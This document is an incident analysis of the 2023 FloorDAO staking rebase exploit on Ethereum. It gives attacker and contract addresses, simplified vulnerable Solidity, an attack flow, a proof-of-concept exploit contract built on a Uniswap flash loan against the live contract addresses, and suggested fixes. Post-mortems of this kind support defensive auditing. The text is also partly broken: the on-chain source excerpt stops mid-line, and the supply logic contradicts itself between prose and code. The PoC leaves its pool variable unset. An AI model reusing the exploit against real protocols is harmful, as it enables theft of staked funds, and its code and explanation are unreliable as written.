# FloorDAO Staking Rebase Manipulation Incident Analysis

## 1. Overview

| Item | Details |
|------|------|
| Project | FloorDAO |
| Date | 2023-09-15 |
| Chain | Ethereum Mainnet |
| Loss | ~40 ETH |
| Attack Type | Flash Loan + Staking Cycle Manipulation (Flash Loan + Stake/Unstake Cycle) |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0x4453aed57c23a50d887a42ad0cd14ff1b819c750` |
| Attack Contract | `0x6ce5a85cff4c70591da82de5eb91c3fa38b40595` |
| Vulnerable Contract | `0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539` (FloorStaking) |
| Fork Block | Ethereum Mainnet |

## 2. Vulnerability Code Analysis

FloorDAO's staking contract is an Olympus DAO fork that calculated rebase rewards based on `sFloor.circulatingSupply()`. By borrowing a large amount of FLOOR tokens via flash loan, repeatedly staking and immediately unstaking, the circulatingSupply calculation could be distorted to obtain excessive rebase rewards.

```solidity
// Vulnerable pattern: rebase calculation based on circulatingSupply
contract FloorStaking {
    IsFloor public sFloor;
    IERC20 public FLOOR;

    // Vulnerable: circulatingSupply can be manipulated
    function rebase() internal returns (uint256) {
        uint256 supply = sFloor.circulatingSupply();
        // When circulatingSupply decreases, the rebase rate increases
        uint256 profit = totalStaked * rebaseRate / supply;
        return profit;
    }

    function stake(uint256 amount, address recipient) external returns (bool) {
        // FLOOR → sFloor minting
        FLOOR.transferFrom(msg.sender, address(this), amount);
        sFloor.mint(recipient, amount);
        return true;
    }

    function unstake(uint256 amount, bool trigger) external returns (uint256) {
        if (trigger) {
            // Vulnerable: rebase triggered on unstake — calculated with manipulated supply
            rebase();
        }
        sFloor.burn(msg.sender, amount);
        FLOOR.transfer(msg.sender, amount);
        return amount;
    }
}

// sFloor's circulatingSupply calculation
contract sFloor {
    function circulatingSupply() external view returns (uint256) {
        // Actual circulating supply excluding the staking contract balance
        return totalSupply() - balanceOf(stakingContract);
    }
}
```

**Vulnerability**: When FLOOR is borrowed via a Uniswap V3 flash loan and staked, sFloor is minted and `circulatingSupply` increases. Calling `unstake(trigger=true)` in this state triggers a rebase, generating abnormal rebase rewards based on the supply distorted by the large-scale staking.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Staking.sol
    function unstake(  // ❌
```

## 3. Attack Flow

```
Attacker [0x4453aed57c23a50d887a42ad0cd14ff1b819c750]
  │
  ├─1─▶ floorUniPool.flash() - Uniswap V3 flash loan
  │      Borrow large amount of FLOOR
  │      [FLOOR: 0xf59257E961883636290411c11ec5Ae622d19455e]
  │
  ├─2─▶ floor.balanceOf() - Check balance
  │
  ├─3─▶ sFloor.circulatingSupply() - Check current circulating supply
  │      [sFloor: 0x164AFe96912099543BC2c48bb9358a095Db8e784]
  │
  ├─4─▶ floor.approve(FloorStaking, amount)
  │      [FloorStaking: 0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539]
  │
  ├─5─▶ staking.stake(amount) - Stake large amount of FLOOR
  │      sFloor minted → circulatingSupply changes
  │
  ├─6─▶ gFloor.balanceOf() - Check gFloor balance
  │      [gFloor: 0xb1Cc59Fc717b8D4783D41F952725177298B5619d]
  │
  ├─7─▶ staking.unstake(amount, trigger=true) - Trigger rebase
  │      Rebase calculated with manipulated circulatingSupply
  │      → Excessive FLOOR profit generated
  │
  ├─8─▶ floorUniPool.swap() - Acquire additional FLOOR
  │
  └─9─▶ floor.transfer(floorUniPool) - Repay flash loan
         Check WETH.balanceOf()
         ~40 ETH profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IFloorStaking {
    function stake(uint256 amount, address recipient) external returns (bool);
    function unstake(uint256 amount, bool trigger) external returns (uint256);
}

interface IsFloor is IERC20 {
    function circulatingSupply() external view returns (uint256);
}

contract FloorDAOExploit {
    IFloorStaking staking = IFloorStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
    IERC20 FLOOR = IERC20(0xf59257E961883636290411c11ec5Ae622d19455e);
    IsFloor sFloor = IsFloor(0x164AFe96912099543BC2c48bb9358a095Db8e784);
    IERC20 gFloor = IERC20(0xb1Cc59Fc717b8D4783D41F952725177298B5619d);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V3 floorUniPool;

    function testExploit() external {
        // Borrow large amount of FLOOR via Uniswap V3 flash loan
        floorUniPool.flash(
            address(this),
            FLOOR.balanceOf(address(floorUniPool)) * 9 / 10,
            0,
            ""
        );
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
        uint256 floorBalance = FLOOR.balanceOf(address(this));

        // Check circulatingSupply
        uint256 supplyBefore = sFloor.circulatingSupply();

        // Large-scale staking → distort circulatingSupply
        FLOOR.approve(address(staking), floorBalance);
        staking.stake(floorBalance, address(this));

        uint256 gFloorBalance = gFloor.balanceOf(address(this));

        // Unstake with trigger=true → rebase with distorted circulatingSupply
        staking.unstake(gFloorBalance, true);

        // Swap excess FLOOR for WETH
        uint256 profitFloor = FLOOR.balanceOf(address(this)) - floorBalance;
        if (profitFloor > 0) {
            floorUniPool.swap(0, profitFloor * 95 / 100, address(this), "");
        }

        // Repay flash loan
        FLOOR.transfer(address(floorUniPool), floorBalance + fee0);
    }
}
```

## 5. Vulnerability Classification

| Item | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | Staking circulatingSupply manipulation, rebase vulnerability |
| Impact Scope | FloorDAO staking reward pool |
| Explorer | [Etherscan](https://etherscan.io/address/0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539) |

## 6. Security Recommendations

```solidity
// Fix 1: Prohibit staking and unstaking within the same block
contract FloorStaking {
    mapping(address => uint256) public lastStakeBlock;

    function stake(uint256 amount, address recipient) external returns (bool) {
        lastStakeBlock[recipient] = block.number;
        // ...
    }

    function unstake(uint256 amount, bool trigger) external returns (uint256) {
        require(block.number > lastStakeBlock[msg.sender], "Cannot unstake in same block as stake");
        // ...
    }
}

// Fix 2: Minimum staking duration
uint256 public constant MIN_STAKE_DURATION = 3 days;
mapping(address => uint256) public stakeTimestamp;

function unstake(uint256 amount, bool trigger) external returns (uint256) {
    require(block.timestamp >= stakeTimestamp[msg.sender] + MIN_STAKE_DURATION, "Too early to unstake");
    // ...
}

// Fix 3: Restrict rebase to a separate time interval
uint256 public lastRebaseTime;
uint256 public constant REBASE_INTERVAL = 8 hours;

function rebase() internal {
    require(block.timestamp >= lastRebaseTime + REBASE_INTERVAL, "Rebase too frequent");
    lastRebaseTime = block.timestamp;
    // circulatingSupply-based calculation
}
```

## 7. Lessons Learned

1. **Olympus DAO Fork Risk**: When forking Olympus DAO-style rebase mechanisms, the security assumptions of the original can break in a modified environment. Fork projects must re-examine the entire security model.
2. **circulatingSupply Manipulation**: If staking/unstaking can significantly change the circulatingSupply in a short period, the rebase calculation is manipulated. Snapshot-based or time-weighted supply should be used instead.
3. **Flash Loan + Rebase Combination**: The pattern of temporarily staking a large amount via flash loan and then triggering a rebase has recurred across many Olympus DAO forks. Prohibiting same-block stake/unstake is the essential defense.
4. **FLOOR NFT DeFi Pattern**: NFT-based DeFi protocols (such as FloorDAO) are equally exposed to the same ERC-20 staking vulnerabilities. An NFT context does not lower the security requirements.